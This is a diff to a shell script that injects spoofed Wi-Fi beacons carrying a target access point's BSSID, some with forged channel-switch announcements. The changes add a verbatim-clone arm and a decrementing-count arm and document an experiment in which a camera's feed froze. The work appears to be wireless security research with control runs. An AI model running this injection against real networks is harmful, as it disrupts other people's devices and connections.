@@ -47,10 +47,24 @@
 # on 5 GHz it cannot work at all (radio0 is 2g, receive-only).
 #
 # Usage:
-#   ./run_17a.sh <inject-if> <bssid> <target-chan> <announce-chan> <count> [watch-if] [--stop-pineapd]
+#   ./run_17a.sh <inject-if> <bssid> <target-chan> <announce-chan> <count> [watch-if]
+#                [--stop-pineapd] [--clone] [--count-dec]
 #
-#   ./run_17a.sh wlan1mon FC:58:5A:08:42:15 8 1 0     # the count-0 control
-#   ./run_17a.sh wlan1mon FC:58:5A:08:42:15 8 1 3     # the arm that should differ
+#   ./run_17a.sh wlan1mon FC:58:5A:08:42:15 8 1 0              # the count-0 control
+#   ./run_17a.sh wlan1mon FC:58:5A:08:42:15 8 1 3              # the arm that should differ
+#   ./run_17a.sh wlan1mon FC:58:5A:08:42:15 8 1 0 --clone      # ⭐ RUN THIS FIRST (see below)
+#   ./run_17a.sh wlan1mon FC:58:5A:08:42:15 8 1 3 --count-dec  # a conformant countdown
+#
+# ⭐ --clone IS THE ARM TO RUN FIRST, and it is new on 2026-11-10. It floods the captured beacon
+# VERBATIM -- no CSA element at all -- which is the only thing that separates "the client honoured
+# the announced switch" from "the client was upset by ~95 spoofed beacons carrying its AP's BSSID".
+# The first 17a run froze a camera's feed identically for count 0 and count 3, and nothing in it
+# distinguished those two explanations. If the feed freezes under --clone too, the element is
+# irrelevant and the count result is about nothing. <announce-chan> and <count> are ignored here.
+#
+# --count-dec decrements the count on every frame, 3,2,1,0 and repeat, as a real AP does. Every run
+# before 2026-11-10 sent a CONSTANT count, which no AP ever sends, and that is the strongest
+# surviving reason the count-3 arm behaved like count 0.
 #
 # Run the control FIRST, reconnect the client, then the count-3 arm. One arm per invocation on
 # purpose: the thing being measured is a client's behaviour, and that needs you watching it.
@@ -66,15 +80,19 @@ die() { printf '%s\n' "$*" >&2; exit 1; }
 
 [ $# -ge 5 ] || die "usage: $0 <inject-if> <bssid> <target-chan> <announce-chan> <count> [watch-if] [--stop-pineapd]"
 IF="$1"; BSSID="$2"; TCHAN="$3"; ACHAN="$4"; COUNT="$5"
-WIF=""; STOP_PINEAPD=0
+WIF=""; STOP_PINEAPD=0; CLONE=0; COUNT_DEC=0
 shift 5
 for a in "$@"; do
   case "$a" in
     --stop-pineapd) STOP_PINEAPD=1 ;;
+    --clone)        CLONE=1 ;;
+    --count-dec)    COUNT_DEC=1 ;;
     -*) die "unknown option: $a" ;;
     *) WIF="$a" ;;
   esac
 done
+[ "$CLONE" = 1 ] && [ "$COUNT_DEC" = 1 ] && die "--clone and --count-dec are different arms: --clone sends no CSA element, so there is no count to decrement"
+[ "$CLONE" = 1 ] && printf -- '!! --clone: <announce-chan> %s and <count> %s are IGNORED -- this arm sends no CSA element at all\n' "$ACHAN" "$COUNT" >&2
 
 [ -x "$PAGERINJ" ] || die "no injector at $PAGERINJ (set PAGERINJ=/path to override)"
 case "$BSSID" in
@@ -306,7 +324,10 @@ if [ -n "$WIF" ]; then
   mkdir -p /root/loot 2>/dev/null
   iface_ready "$WIF" || { printf -- '-- %s is not up; bringing it up\n' "$WIF" >&2; bring_up "$WIF" || true; }
   iw dev "$WIF" set freq "$FREQ" 20 2>/dev/null
-  OUT="/root/loot/csa_17a_c${COUNT}_$(date +%s 2>/dev/null || echo now).pcap"
+  if [ "$CLONE" = 1 ]; then ARM=clone
+  elif [ "$COUNT_DEC" = 1 ]; then ARM="c${COUNT}dec"
+  else ARM="c${COUNT}"; fi
+  OUT="/root/loot/csa_17a_${ARM}_$(date +%s 2>/dev/null || echo now).pcap"
   # ONE primitive, on purpose. An earlier revision used
   #   (type mgt and subtype beacon or subtype action) and wlan addr2 <bssid>
   # and `subtype action` is NOT in pcap-filter's mgt subtype list, so the filter never compiled.
@@ -331,7 +352,16 @@ if [ -n "$WIF" ]; then
 fi
 
 printf -- '-- firing\n' >&2
-"$PAGERINJ" -i "$IF" --csa --bssid "$BSSID" --chan "$ACHAN" --count "$COUNT" --secs 10
+# Three explicit branches rather than one line with a conditionally-expanded flag: an unquoted
+# ${VAR:+--flag} is the shape that silently word-splits, and this is the line that decides what
+# goes on the air.
+if [ "$CLONE" = 1 ]; then
+  "$PAGERINJ" -i "$IF" --clone --bssid "$BSSID" --secs 10
+elif [ "$COUNT_DEC" = 1 ]; then
+  "$PAGERINJ" -i "$IF" --csa --bssid "$BSSID" --chan "$ACHAN" --count "$COUNT" --count-dec --secs 10
+else
+  "$PAGERINJ" -i "$IF" --csa --bssid "$BSSID" --chan "$ACHAN" --count "$COUNT" --secs 10
+fi
 RC=$?
 
 if [ -n "$CAP" ]; then
